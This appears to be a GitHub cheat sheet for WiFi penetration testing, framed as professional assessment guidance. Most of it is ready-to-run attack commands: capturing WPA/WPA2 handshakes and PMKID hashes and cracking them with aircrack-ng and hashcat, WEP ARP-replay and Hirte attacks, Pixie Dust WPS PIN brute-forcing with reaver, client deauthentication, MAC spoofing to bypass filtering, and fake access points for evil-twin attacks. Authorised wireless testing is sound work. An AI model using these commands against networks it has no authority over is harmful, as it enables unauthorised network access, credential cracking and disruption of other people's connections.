# WiFi Penetration Testing Cheat Sheet

The following information should ideally be obtained/enumerated when carrying out your wireless assessment. All this information is needed to give the tester, (and hence, the customer), a clear and concise picture of the network you are assessing. A brief overview of the network during a pre-site meeting with the customer should allow you to estimate the timescales required to carry the assessment out.

For help with any of the tools type `<tool_name> [-h | -hh | --help]` or `man <tool_name>`.

Sometimes `-h` can be mistaken for a host or some other option. If that's the case, use `-hh` or `--help` instead, or read the manual with `man`.

Websites that you should use while writing the report:

* [cwe.mitre.org/data](https://cwe.mitre.org/data)
* [owasp.org/projects](https://owasp.org/projects)
* [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/Glossary.html)
* [nvd.nist.gov/vuln-metrics/cvss/v3-calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)
* [nvd.nist.gov/ncp/repository](https://nvd.nist.gov/ncp/repository)
* [attack.mitre.org](https://attack.mitre.org)

Check the most popular tool for auditing wireless networks [v1s1t0r1sh3r3/airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon). Credits to the author!

## Table of Contents

**1. [Configuration](#1-configuration)**

**2. [Monitoring](#2-monitoring)**

**3. [Cracking](#3-cracking)**

* [WPA/WPA2 Handshake](#wpawpa2-handshake) (WPA/WPA2)
* [PMKID Attack](#pmkid-attack) (WPA/WPA2)
* [ARP Request Replay Attack](#arp-request-replay-attack) (WEP)
* [Hitre Attack](#hitre-attack) (WEP)
* [WPS PIN](#wps-pin)

**4. [Wordlists](#4-wordlists)**

**5. [Post-Exploitation](#5-post-exploitation)**

**6. [Evil-Twin](#6-evil-twin)**

## 1. Configuration

View the configuration of network interfaces:

```bash
ifconfig && iwconfig && airmon-ng
```

Turn a network interface on/off:

```fundamental
ifconfig wlan0 up

ifconfig wlan0 down
```

Restart the network manager:

```fundamental
service NetworkManager restart
```

Check the WLAN regulatory domain:

```fundamental
iw reg get
```

Set the WLAN regulatory domain:

```fundamental
iw reg set HR
```

Turn the power of a wireless interface up/down (too high can be illegal in some countries):

```fundamental
iwconfig wlan0 txpower 40
```

## 2. Monitoring

Set a wireless network interface to the monitoring mode:

```bash
airmon-ng start wlan0

ifconfig wlan0 down && iwconfig wlan0 mode monitor && ifconfig wlan0 up
```

Set a wireless network interface to the monitoring mode on a specified channel:

```fundamental
airmon-ng start wlan0 8

iwconfig wlan0 channel 8
```

\[Optional\] Kill services that might interfere with wireless network interfaces in the monitoring mode:

```fundamental
airmon-ng check kill
```

Set a wireless network interface back to the managed mode:

```bash
airmon-ng stop wlan0mon

ifconfig wlan0 down && iwconfig wlan0 mode managed && ifconfig wlan0 up
```

Search for WiFi networks within your range:

```fundamental
airodump-ng --wps -w airodump_sweep_results wlan0mon

wash -a -i wlan0mon
```

\[Optional\] Install `reaver/wash` on WiFi Pineapple Mark VII:

```bash
opkg update && opkg install libpcap reaver
```

\[Optional\] Install `reaver/wash` on WiFi Pineapple Nano:

```bash
opkg update && opkg install libpcap && opkg -d sd install wash
```

Monitor a WiFi network to capture handshakes/requests:

```fundamental
airodump-ng wlan0mon --channel 8 -w airodump_essid_results --essid essid --bssid FF:FF:FF:FF:FF:FF
```

If you specified the output file, don't forget to stop `airodump-ng` after you are done monitoring because it will fill up all your free storage space with a large PCAP file.

Use [Kismet](https://github.com/ivan-sincek/evil-twin#additional-kismet) or WiFi Pineapple to find more information about wireless access points, e.g. their MAC address, vendor's name, etc.

Check if a wireless interface supports packet injection:

```fundamental
aireplay-ng --test wlan1 -e essid -a FF:FF:FF:FF:FF:FF
```

## 3. Cracking

### WPA/WPA2 Handshake

Monitor a WiFi network to capture a WPA/WPA2 4-way handshake:

```fundamental
airodump-ng wlan0mon --channel 8 -w airodump_essid_results --essid essid --bssid FF:FF:FF:FF:FF:FF
```

\[Optional\] Deauthenticate clients from a WiFi network:

```fundamental
aireplay-ng --deauth 10 wlan1 -e essid -a FF:FF:FF:FF:FF:FF
```

Start the dictionary attack against a WPA/WPA2 handshake:

```fundamental
aircrack-ng -e essid -b FF:FF:FF:FF:FF:FF -w rockyou.txt airodump_essid_results*.cap
```

## PMKID Attack

Crack the WPA/WPA2 authentication without deauthenticating clients.

Install required tools on Kali Linux:

```bash
apt-get update && apt-get -y install hcxtools
```

\[Optional\] Install required tool on WiFi Pineapple Mark VII:

```bash
opkg update && opkg install hcxdumptool
```

\[Optional\] Install required tool on WiFi Pineapple Nano:

```bash
opkg update && opkg -d sd install hcxdumptool
```

Start capturing PMKID hashes for all nearby networks:

```fundamental
hcxdumptool --enable_status=1 -o hcxdumptool_results.cap -i wlan0mon
```

\[Optional\] Start capturing PMKID hashes for specified WiFi networks:

```bash
echo HH:HH:HH:HH:HH:HH | sed 's/\://g' >> filter.txt

hcxdumptool --enable_status=1 -o hcxdumptool_results.cap -i wlan0mon --filterlist_ap=filter.txt --filtermode=2
```

Sometimes it can take hours to capture a single PMKID hash.

Extract PMKID hashes from a PCAP file:

```fundamental
hcxpcaptool hcxdumptool_results.cap -k hashes.txt
```

Start the dictionary attack against PMKID hashes:

```fundamental
hashcat -m 16800 -a 0 --session=cracking --force --status -O -o hashcat_results.txt hashes.txt rockyou.txt
```

Find out more about Hashcat from my other [project](https://github.com/ivan-sincek/penetration-testing-cheat-sheet#hashcat).

###WEP
## ARP Request Replay Attack

If target WiFi network is not busy, it can take days to capture enough IVs to crack the WEP authentication.

Do the fake authentication to a WiFi network with non-existing MAC address and keep the connection alive:

```fundamental
aireplay-ng --fakeauth 6000 -o 1 -q 10 wlan1 -e essid -a FF:FF:FF:FF:FF:FF -h FF:FF:FF:FF:FF:FF
```

If MAC address filtering is active, do the fake authentication to a WiFi network with an existing MAC address:

```fundamental
aireplay-ng --fakeauth 0 wlan1 -e essid -a FF:FF:FF:FF:FF:FF -h FF:FF:FF:FF:FF:FF
```

To monitor the number of captured IVs, run `airodump-ng` against a WiFi network and watch the `#Data` column (try to capture around 100k IVs):

```fundamental
airodump-ng wlan0mon --channel 8 -w airodump_essid_results --essid essid --bssid FF:FF:FF:FF:FF:FF
```

Start the standard ARP request replaying against a WiFi network:

```fundamental
aireplay-ng --arpreplay wlan1 -e essid -a FF:FF:FF:FF:FF:FF -h FF:FF:FF:FF:FF:FF
```

\[Optional\] Deauthenticate clients from a WiFi network:

```fundamental
aireplay-ng --deauth 10 wlan1 -e essid -a FF:FF:FF:FF:FF:FF
```

Crack the WEP authentication:

```fundamental
aircrack-ng -e essid -b FF:FF:FF:FF:FF:FF replay_arp*.cap
```

## Hitre Attack

This attack targets clients, not wireless access points. You must know the SSIDs of your target's WiFi networks.

\[Optional\] Set up a fake WEP WiFi network if the real one is not present:

```fundamental
airbase-ng -W 1 -N wlan0mon -c 8 --essid essid -a FF:FF:FF:FF:FF:FF
```

If needed, turn up the power of a wireless network interface to missassociate clients to the fake WiFi network, see how in [1. Configuration](#1-configuration).

Monitor the real/fake WiFi network to capture handshakes/requests:

```fundamental
airodump-ng wlan0mon --channel 8 -w airodump_essid_results --essid essid --bssid FF:FF:FF:FF:FF:FF
```

Start replaying packets to clients within your range:

```fundamental
aireplay-ng --cfrag -D wlan1 -e essid -h FF:FF:FF:FF:FF:FF
```

\[Optional\] Deauthenticate clients from the real/fake WiFi network:

```fundamental
aireplay-ng --deauth 10 wlan1 -e essid -a FF:FF:FF:FF:FF:FF
```

Crack the WEP authentication:

```fundamental
aircrack-ng -e essid -b FF:FF:FF:FF:FF:FF airodump_essid_results*.cap
```

### WPS PIN

Crack a WPS PIN:

```fundamental
reaver -vv --pixie-dust -i wlan1 -c 8 -e essid -b FF:FF:FF:FF:FF:FF
```

Crack a WPS PIN with some delay between attempts:

```fundamental
reaver -vv --pixie-dust -N -L -d 5 -r 3:15 -T 0.5 -i wlan1 -c 8 -e essid -b FF:FF:FF:FF:FF:FF
```

## 4. Wordlists

You can find `rockyou.txt` wordlist located at `/usr/share/wordlists/` or in SecLists.

Download a useful collection of multiple types of lists for security assessments.

Installation:

```bash
apt-get update && apt-get install seclists
```

Lists will be stored at `/usr/share/seclists/`.

Or, manually download the collection from [GitHub](https://github.com/danielmiessler/SecLists/releases).

Another popular wordlist collections:

* [xmendez/wfuzz](https://github.com/xmendez/wfuzz)
* [assetnote/commonspeak2-wordlists](https://github.com/assetnote/commonspeak2-wordlists)
* [weakpass.com/wordlist](https://weakpass.com/wordlist)
* [packetstormsecurity.com/Crackers/wordlists](https://packetstormsecurity.com/Crackers/wordlists)

### Online Bruteforce for WPA3/WAP2 

Check the team blunderbuss-wctf for their online bruteforce tool. [blunderbuss-wctf/wacker](https://github.com/blunderbuss-wctf/wacker)Credits to the author!

## 5. Post-Exploitation

If MAC address filtering is active, change the MAC address of a wireless interface to an existing one:

```fundamental
ifconfig wlan0 down && macchanger --mac FF:FF:FF:FF:FF:FF && ifconfig wlan0 up
```

Once you get an access to a WiFi network, run the following tools:

```fundamental
wireshark

nmap

responder

Just a regular pentest from here on out.
```

Find out how to pipe `tcpdump` from WiFi Pineapple to Wireshark from my other [poject](https://github.com/m1ddl3w4r3/Wi-Fi-Evil-Twin#sniff-wifi-network-traffic).

Try to access the wireless access point's web interface. Search the Internet for default paths and credentials.

Start scanning/enumerating the network.

## 6. Evil-Twin

Find out how to set up a fake authentication web page on a fake WiFi network with WiFi Pineapple Mark VII Basic from my other [project](https://github.com/m1ddl3w4r3/Wi-Fi-Evil-Twin), as well as how to set up all the tools from this cheat sheet.
